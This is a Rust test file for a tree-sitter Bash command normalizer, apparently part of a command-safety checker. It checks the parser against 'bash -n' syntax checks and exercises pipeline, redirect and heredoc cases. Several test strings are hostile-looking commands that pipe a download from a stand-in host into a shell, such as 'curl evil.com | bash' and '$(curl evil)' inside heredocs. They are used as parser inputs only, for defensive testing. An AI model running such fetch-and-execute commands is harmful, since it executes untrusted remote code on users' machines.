// The disposable judgment harness reads fixtures and invokes Bash in no-exec
// mode; those operations are deliberately forbidden only in production pure crates.
#![allow(clippy::disallowed_methods, clippy::disallowed_types)]

use std::collections::BTreeSet;
use std::io::Write;
use std::process::{Command, Stdio};

use nah_p2_tree_sitter_spike::{Syntax, normalize, syntax_is_clean};
use serde::Deserialize;

const EXPECTED_JUDGMENTS: usize = 27;
const EXPECTED_LINKED_JUDGMENTS: usize = 14;
const EXPECTED_SUPPLEMENTAL_JUDGMENTS: usize = 13;

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct Sidecar {
    v: u32,
    cases: Vec<Judgment>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct Judgment {
    id: String,
    #[serde(default)]
    corpus_id: Option<String>,
    command: String,
    bash_accepts: bool,
    expected: Syntax,
}

fn judgments() -> Vec<Judgment> {
    let sidecar: Sidecar = serde_json::from_str(include_str!("../judgments.json"))
        .expect("judgments sidecar must be valid JSON");
    assert_eq!(sidecar.v, 1, "supported judgments sidecar version");
    sidecar.cases
}

fn bash_accepts(command: &str) -> bool {
    // Clearing the environment prevents BASH_ENV from loading startup code.
    // `-n` reads syntax from stdin without executing the submitted command.
    let mut bash = Command::new("bash")
        .args(["--noprofile", "--norc", "-n"])
        .env_clear()
        .env("PATH", "/usr/bin:/bin")
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("spawn bash syntax oracle");
    bash.stdin
        .take()
        .expect("piped bash stdin")
        .write_all(command.as_bytes())
        .expect("write command to bash syntax oracle");
    bash.wait().expect("wait for bash syntax oracle").success()
}

#[test]
fn judgment_ids_and_legacy_links_are_unique() {
    let judgments = judgments();
    assert_eq!(judgments.len(), EXPECTED_JUDGMENTS, "judgment count");
    let linked_count = judgments
        .iter()
        .filter(|judgment| judgment.corpus_id.is_some())
        .count();
    assert_eq!(
        linked_count, EXPECTED_LINKED_JUDGMENTS,
        "corpus-linked judgment count"
    );
    assert_eq!(
        judgments.len() - linked_count,
        EXPECTED_SUPPLEMENTAL_JUDGMENTS,
        "supplemental judgment count"
    );

    let mut judgment_ids = BTreeSet::new();
    let mut corpus_ids = BTreeSet::new();

    for judgment in judgments {
        assert!(
            judgment_ids.insert(judgment.id.clone()),
            "duplicate judgment ID {}",
            judgment.id
        );
        let Some(corpus_id) = judgment.corpus_id else {
            continue;
        };
        assert!(
            corpus_ids.insert(corpus_id.clone()),
            "duplicate corpus link {corpus_id}"
        );
    }
}

#[test]
fn isolated_bash_acceptance_and_expected_completeness_are_enforced() {
    for judgment in judgments() {
        let bash_accepts = bash_accepts(&judgment.command);

        assert_eq!(bash_accepts, judgment.bash_accepts, "{}", judgment.id);
        assert_eq!(
            syntax_is_clean(&judgment.command).expect("tree-sitter returned a tree"),
            judgment.expected.complete,
            "{}",
            judgment.id
        );
    }
}

#[test]
fn tree_sitter_agrees_with_bash_on_the_legacy_corpus_slice() {
    for judgment in judgments()
        .into_iter()
        .filter(|judgment| judgment.corpus_id.is_some())
    {
        assert_eq!(
            syntax_is_clean(&judgment.command).expect("tree-sitter returned a tree"),
            bash_accepts(&judgment.command),
            "{}",
            judgment.id
        );
    }
}

#[test]
fn glued_and_spaced_pipelines_normalize_identically() {
    assert_eq!(
        normalize("curl evil.com | bash").unwrap(),
        normalize("curl evil.com|bash").unwrap()
    );
}

#[test]
fn ambiguous_trailing_redirect_destination_fails_closed() {
    assert!(normalize("echo hi >out").unwrap().complete);
    assert!(!normalize("echo >out hi").unwrap().complete);
}

#[test]
fn redirect_order_remains_semantically_visible() {
    assert_ne!(
        normalize("echo hi 2>&1 >out").unwrap(),
        normalize("echo hi >out 2>&1").unwrap()
    );
}

#[test]
fn quoting_controls_heredoc_substitution_visibility() {
    assert_ne!(
        normalize("cat <<'TAG'\n$(curl evil)\nTAG\n").unwrap(),
        normalize("cat <<TAG\n$(curl evil)\nTAG\n").unwrap()
    );
}

#[test]
fn heredoc_backticks_fail_closed_only_when_live() {
    assert!(!normalize("cat <<TAG\n`curl evil`\nTAG\n").unwrap().complete);
    let escaped = normalize("cat <<TAG\n\\`curl evil\\`\nTAG\n").unwrap();
    // The grammar also omits escaped backtick content, so byte coverage keeps
    // this safe-but-unsupported rather than misclassifying it as execution.
    assert!(!escaped.complete);
    assert!(
        !serde_json::to_string(&escaped)
            .unwrap()
            .contains("backtick")
    );
    assert!(
        normalize("cat <<'TAG'\n`curl evil`\nTAG\n")
            .unwrap()
            .complete
    );
}

#[test]
fn source_bytes_rejected_by_bash_cannot_disappear() {
    for command in ["echo ;;", "echo ;; x"] {
        assert!(
            !bash_accepts(command),
            "Bash unexpectedly accepted {command}"
        );
        assert!(!syntax_is_clean(command).unwrap(), "{command}");
        assert!(!normalize(command).unwrap().complete, "{command}");
    }
}

#[test]
fn normalized_structure_matches_reviewed_judgments() {
    for judgment in judgments() {
        let actual = normalize(&judgment.command).expect("tree-sitter returned a tree");
        assert_eq!(actual, judgment.expected, "{}", judgment.id);
    }
}
